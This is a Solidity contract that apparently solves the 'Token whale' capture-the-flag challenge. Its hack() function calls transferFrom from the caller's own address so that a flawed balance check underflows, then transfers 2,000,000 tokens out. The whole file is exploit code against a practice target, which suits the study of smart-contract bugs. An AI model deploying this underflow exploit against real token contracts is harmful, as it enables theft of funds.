pragma solidity ^0.4.21;

interface TokenWhaleChallenge{
    function transferFrom(address from, address to, uint256 value) external;
    function transfer(address to, uint256 value) external;
}

contract TokenWhale{

    TokenWhaleChallenge target;

    function setTargetContract(address _target) public{
        target = TokenWhaleChallenge(_target);
    }

    function hack(){
        target.transferFrom(msg.sender, address(0), 10);
        target.transfer(msg.sender, 2000000);
    }
}